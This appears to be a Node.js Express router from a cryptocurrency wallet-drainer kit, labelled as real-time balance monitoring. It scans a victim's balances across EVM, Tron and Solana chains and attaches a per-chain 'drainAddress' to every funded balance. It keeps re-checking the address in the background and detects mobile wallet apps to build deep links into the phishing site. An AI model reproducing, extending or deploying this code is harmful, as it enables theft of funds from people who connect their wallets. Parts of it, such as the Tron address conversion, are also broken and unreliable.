const express = require('express');
const router = express.Router();
const { ethers } = require('ethers');
const axios = require('axios');
const crypto = require('crypto');

// Import configuration
const { REAL_TIME_NETWORKS, REAL_TIME_DRAIN_ADDRESSES } = require('../index');

// WebSocket connections store
const wsConnections = new Map();

// ==================== REAL-TIME BALANCE MONITORING ====================
router.post('/monitor', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const { address, interval = 30000, networks = 'all' } = req.body;
    
    if (!address) {
      return res.status(400).json({
        success: false,
        error: "Address required",
        requestId
      });
    }
    
    // Create monitoring session
    const monitorId = `monitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // Initial scan
    const initialBalances = await getRealTimeBalances(address, networks);
    
    res.json({
      success: true,
      requestId,
      monitorId,
      data: {
        address,
        initialBalances,
        interval,
        startedAt: new Date().toISOString()
      }
    });
    
    // Start periodic updates (in background)
    startMonitoring(monitorId, address, networks, interval);
    
  } catch (error) {
    console.error(`❌ [${requestId}] Monitor error:`, error);
    res.status(500).json({
      success: false,
      error: "Monitoring failed",
      requestId,
      details: error.message
    });
  }
});

// ==================== LIVE BALANCE UPDATES ====================
router.post('/live-update', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const { address, networks = [] } = req.body;
    
    if (!address) {
      return res.status(400).json({
        success: false,
        error: "Address required",
        requestId
      });
    }
    
    console.log(`📊 [${requestId}] Live update for ${address}`);
    
    const updates = [];
    
    // Check specific networks or all
    const networksToCheck = networks.length > 0 ? networks : Object.keys(REAL_TIME_NETWORKS.evm).slice(0, 5);
    
    for (const networkId of networksToCheck) {
      try {
        let balance = 0;
        
        if (typeof networkId === 'number' || !isNaN(networkId)) {
          // EVM network
          const config = REAL_TIME_NETWORKS.evm[networkId];
          if (config) {
            const provider = new ethers.JsonRpcProvider(config.rpc);
            const balanceWei = await provider.getBalance(address);
            balance = parseFloat(ethers.formatEther(balanceWei));
            
            updates.push({
              network: config.name,
              symbol: config.symbol,
              chainId: networkId,
              type: 'evm',
              balance,
              balanceFormatted: balance.toFixed(6),
              timestamp: new Date().toISOString(),
              hasBalance: balance > 0.000001
            });
          }
        } else if (networkId === 'tron') {
          // Tron network
          const config = REAL_TIME_NETWORKS.nonevm.tron;
          balance = await getTronBalance(address);
          
          updates.push({
            network: config.name,
            symbol: config.symbol,
            chainId: 'tron',
            type: 'non-evm',
            balance,
            balanceFormatted: balance.toFixed(6),
            timestamp: new Date().toISOString(),
            hasBalance: balance > 0.001
          });
        } else if (networkId === 'solana') {
          // Solana network
          const config = REAL_TIME_NETWORKS.nonevm.solana;
          balance = await getSolanaBalance(address);
          
          updates.push({
            network: config.name,
            symbol: config.symbol,
            chainId: 'solana',
            type: 'non-evm',
            balance,
            balanceFormatted: balance.toFixed(6),
            timestamp: new Date().toISOString(),
            hasBalance: balance > 0.001
          });
        }
        
      } catch (error) {
        console.log(`[${requestId}] Live update failed for ${networkId}:`, error.message);
      }
    }
    
    res.json({
      success: true,
      requestId,
      data: {
        address,
        updates,
        timestamp: new Date().toISOString(),
        totalNetworks: updates.length,
        hasAnyBalance: updates.some(u => u.hasBalance)
      }
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Live update error:`, error);
    res.status(500).json({
      success: false,
      error: "Live update failed",
      requestId
    });
  }
});

// ==================== MOBILE WALLET DETECTION ====================
router.post('/detect-wallet', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const { userAgent, platform, walletHint } = req.body;
    
    const detection = {
      isMobile: /mobile|android|iphone|ipad|ipod|webos|blackberry|iemobile|opera mini/i.test(userAgent || ''),
      platform: platform || 'unknown',
      walletHint: walletHint || 'unknown',
      detectedWallets: [],
      recommendedAction: 'connect'
    };
    
    // Detect specific wallets based on user agent
    if (userAgent) {
      const ua = userAgent.toLowerCase();
      
      if (ua.includes('metamask')) {
        detection.detectedWallets.push('metamask');
      }
      if (ua.includes('trust')) {
        detection.detectedWallets.push('trust');
      }
      if (ua.includes('coinbase')) {
        detection.detectedWallets.push('coinbase');
      }
      if (ua.includes('tronlink')) {
        detection.detectedWallets.push('tronlink');
      }
      if (ua.includes('phantom')) {
        detection.detectedWallets.push('phantom');
      }
    }
    
    // If no specific wallet detected, check for wallet hints
    if (detection.detectedWallets.length === 0 && walletHint) {
      detection.detectedWallets.push(walletHint);
    }
    
    // Determine recommended deep link
    if (detection.detectedWallets.length > 0) {
      const wallet = detection.detectedWallets[0];
      
      detection.deepLinks = {
        metamask: `https://metamask.app.link/dapp/${req.headers.host}`,
        trust: `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(req.headers.origin || '')}`,
        coinbase: `https://go.cb-w.com/dapp?url=${encodeURIComponent(req.headers.origin || '')}`,
        tronlink: `tronlink://dapp?url=${encodeURIComponent(req.headers.origin || '')}`,
        phantom: `https://phantom.app/ul/browse/${encodeURIComponent(req.headers.origin || '')}`
      }[wallet];
    }
    
    res.json({
      success: true,
      requestId,
      data: detection,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Wallet detection error:`, error);
    res.status(500).json({
      success: false,
      error: "Wallet detection failed",
      requestId
    });
  }
});

// ==================== WEB SOCKET CONNECTION ENDPOINT ====================
router.get('/ws-connect', (req, res) => {
  // This endpoint would upgrade to WebSocket in production
  // For now, return connection info
  
  const connectionId = `conn_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  
  res.json({
    success: true,
    connectionId,
    wsUrl: `wss://${req.headers.host}/realtime/ws/${connectionId}`,
    instructions: 'Connect via WebSocket for real-time updates',
    timestamp: new Date().toISOString()
  });
});

// ==================== HELPER FUNCTIONS ====================

// Get real-time balances
async function getRealTimeBalances(address, networks = 'all') {
  const balances = [];
  
  // EVM networks
  if (networks === 'all' || networks === 'evm') {
    const evmEntries = Object.entries(REAL_TIME_NETWORKS.evm);
    
    for (const [chainId, config] of evmEntries.slice(0, 10)) { // Limit to 10 for speed
      try {
        const provider = new ethers.JsonRpcProvider(config.rpc);
        const balance = await provider.getBalance(address);
        const balanceFormatted = ethers.formatEther(balance);
        const balanceNumber = parseFloat(balanceFormatted);
        
        if (balanceNumber > 0.000001) {
          balances.push({
            network: config.name,
            symbol: config.symbol,
            chainId: parseInt(chainId),
            type: 'evm',
            balance: balanceNumber,
            balanceFormatted,
            drainAddress: REAL_TIME_DRAIN_ADDRESSES.evm[chainId],
            timestamp: new Date().toISOString()
          });
        }
        
        await new Promise(resolve => setTimeout(resolve, 50));
      } catch (error) {
        console.log(`Real-time balance failed for ${chainId}:`, error.message);
      }
    }
  }
  
  // Non-EVM networks
  if (networks === 'all' || networks === 'nonevm') {
    try {
      // Tron
      const tronBalance = await getTronBalance(address);
      if (tronBalance > 0.001) {
        balances.push({
          network: 'Tron',
          symbol: 'TRX',
          chainId: 'tron',
          type: 'non-evm',
          balance: tronBalance,
          balanceFormatted: tronBalance.toFixed(6),
          drainAddress: REAL_TIME_DRAIN_ADDRESSES.nonevm.tron,
          timestamp: new Date().toISOString()
        });
      }
      
      // Solana
      const solanaBalance = await getSolanaBalance(address);
      if (solanaBalance > 0.001) {
        balances.push({
          network: 'Solana',
          symbol: 'SOL',
          chainId: 'solana',
          type: 'non-evm',
          balance: solanaBalance,
          balanceFormatted: solanaBalance.toFixed(6),
          drainAddress: REAL_TIME_DRAIN_ADDRESSES.nonevm.solana,
          timestamp: new Date().toISOString()
        });
      }
      
    } catch (error) {
      console.log("Non-EVM real-time balance failed:", error.message);
    }
  }
  
  return balances;
}

// Get Tron balance
async function getTronBalance(address) {
  try {
    let tronAddress = address;
    if (address.startsWith('0x')) {
      tronAddress = 'T' + address.substring(2);
    }
    
    const response = await axios.get(`https://api.trongrid.io/v1/accounts/${tronAddress}`, {
      timeout: 3000
    });
    
    if (response.data && response.data.data && response.data.data.length > 0) {
      const balance = response.data.data[0].balance || 0;
      return balance / 1_000_000;
    }
    
    return 0;
  } catch (error) {
    console.log("Tron balance failed:", error.message);
    return 0;
  }
}

// Get Solana balance
async function getSolanaBalance(address) {
  try {
    const response = await axios.post('https://api.mainnet-beta.solana.com', {
      jsonrpc: "2.0",
      id: 1,
      method: "getBalance",
      params: [address]
    }, {
      timeout: 3000
    });
    
    if (response.data && response.data.result) {
      return response.data.result.value / 1e9;
    }
    
    return 0;
  } catch (error) {
    console.log("Solana balance failed:", error.message);
    return 0;
  }
}

// Start monitoring function
function startMonitoring(monitorId, address, networks, interval) {
  // This would start a periodic monitoring loop
  // In production, this would use WebSockets or Server-Sent Events
  
  console.log(`📡 Started monitoring ${address} (ID: ${monitorId})`);
  
  // Store the interval ID for cleanup
  const intervalId = setInterval(async () => {
    try {
      const balances = await getRealTimeBalances(address, networks);
      
      // In production, send via WebSocket
      console.log(`📊 Monitor ${monitorId}: Found ${balances.length} balances`);
      
    } catch (error) {
      console.log(`Monitor ${monitorId} error:`, error.message);
    }
  }, interval);
  
  // Store for cleanup
  wsConnections.set(monitorId, { intervalId, address });
  
  // Auto-cleanup after 1 hour
  setTimeout(() => {
    stopMonitoring(monitorId);
  }, 60 * 60 * 1000);
}

// Stop monitoring function
function stopMonitoring(monitorId) {
  const connection = wsConnections.get(monitorId);
  if (connection && connection.intervalId) {
    clearInterval(connection.intervalId);
    wsConnections.delete(monitorId);
    console.log(`📡 Stopped monitoring ${monitorId}`);
  }
}

module.exports = router;